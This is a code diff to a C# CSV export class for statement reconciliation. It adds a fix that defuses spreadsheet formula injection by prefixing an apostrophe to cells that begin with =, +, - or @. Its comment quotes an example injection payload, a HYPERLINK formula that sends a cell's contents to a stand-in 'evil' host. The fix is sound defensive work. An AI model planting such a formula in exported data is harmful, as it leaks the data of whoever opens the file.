@@ -122,6 +122,30 @@ public static class StatementReconciliationCsv
     private static string A(decimal? value)
         => value is null ? string.Empty : value.Value.ToString("0.00", CultureInfo.InvariantCulture);
 
+    /// <summary>
+    /// One cell, quoted for RFC 4180 and defused for a spreadsheet.
+    /// </summary>
+    /// <remarks>
+    /// <para>
+    /// A cell that STARTS with <c>=</c>, <c>+</c>, <c>-</c> or <c>@</c> is a FORMULA to a
+    /// spreadsheet, and this file is opened in one. The destination is what the customer typed, so
+    /// a payer can put <c>=HYPERLINK("http://evil/?d="&amp;A1)</c> there and have the accountant's
+    /// Excel fetch it the moment the file is opened.
+    /// </para>
+    /// <para>
+    /// The apostrophe is Excel's own "this is text" marker: the cell shows what the payer typed,
+    /// and the spreadsheet drops the marker when it reads the value back. The numbers are not
+    /// touched — they are written by <see cref="A"/> and a negative amount is a number, not a
+    /// formula.
+    /// </para>
+    /// </remarks>
     private static string Q(string? value)
-        => "\"" + (value ?? string.Empty).Replace("\"", "\"\"") + "\"";
+    {
+        var text = value ?? string.Empty;
+
+        if (text.Length > 0 && (text[0] is '=' or '+' or '-' or '@'))
+            text = "'" + text;
+
+        return "\"" + text.Replace("\"", "\"\"") + "\"";
+    }
 }
